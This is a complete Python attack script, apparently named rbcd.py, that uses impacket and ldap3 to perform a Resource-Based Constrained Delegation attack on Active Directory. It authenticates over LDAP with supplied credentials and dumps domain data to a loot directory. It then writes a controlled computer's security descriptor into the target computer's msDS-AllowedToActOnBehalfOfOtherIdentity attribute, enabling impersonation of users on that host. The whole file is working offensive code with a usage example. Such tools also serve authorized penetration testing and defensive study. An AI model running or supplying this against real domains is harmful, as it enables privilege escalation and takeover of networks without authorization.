import sys
import argparse
import ldap3
import ldapdomaindump
from impacket import version
from impacket import logging
from impacket.examples import logger
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

print(version.BANNER)

parser = argparse.ArgumentParser(add_help=True, description='Resource-Based Constrained Delegation Attack: allow an attacker controllable (preferably previously created fake) computer for delegation on a target computer (where the attacker has write access to properties through LDAP)')
parser._optionals.title = "Main options"
parser._positionals.title = "Required options"

#Main parameters
maingroup = parser.add_argument_group("Main options")
parser.add_argument("host", metavar='HOSTNAME', help="Hostname/ip or ldap://host:port connection string to connect to the AD")
parser.add_argument("-u", "--user", required=True, metavar='USERNAME', help="DOMAIN\\username for authentication")
parser.add_argument("-p", "--password", required=True, metavar='PASSWORD', help="Password or LM:NTLM hash, will prompt if not specified")
parser.add_argument('-t', required=True, action='store', metavar='COMPUTERNAME', help='Target computer hostname where the attacker has write access to properties')
parser.add_argument('-f', required=True, action='store', metavar='COMPUTERNAME', help='(Fake) computer hostname which the attacker can control')

if len(sys.argv) == 1:
    parser.print_help()
    print('\nExample: ./rbcd.py -host 10.10.10.1 -u domain\\\\user -p P@ssw0rd@123 -t WEB -f FAKECOMP')
    sys.exit(1)

options = parser.parse_args()

c = NTLMRelayxConfig()
c.addcomputer = options.f
c.target = options.host

logger.init()
logging.getLogger().setLevel(logging.INFO)
logging.info('Starting Resource Based Constrained Delegation Attack against {}$'.format(options.t))

logging.info('Initializing LDAP connection to {}'.format(options.host))
#tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
serv = ldap3.Server(options.host, tls=False, get_info=ldap3.ALL)
logging.info('Using {} account with password ***'.format(options.user))
conn = ldap3.Connection(serv, user=options.user, password=options.password, authentication=ldap3.NTLM)
conn.bind()
logging.info('LDAP bind OK')

logging.info('Initializing domainDumper()')
cnf = ldapdomaindump.domainDumpConfig()
cnf.basepath = c.lootdir
dd = ldapdomaindump.domainDumper(serv, conn, cnf)

logging.info('Initializing LDAPAttack()')
la = LDAPAttack(c, conn, options.user.replace('\\', '/'))

logging.info('Writing SECURITY_DESCRIPTOR related to (fake) computer `{}` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `{}`'.format(options.f, options.t))
la.delegateAttack(options.f+'$', options.t+'$', dd, sid=None)
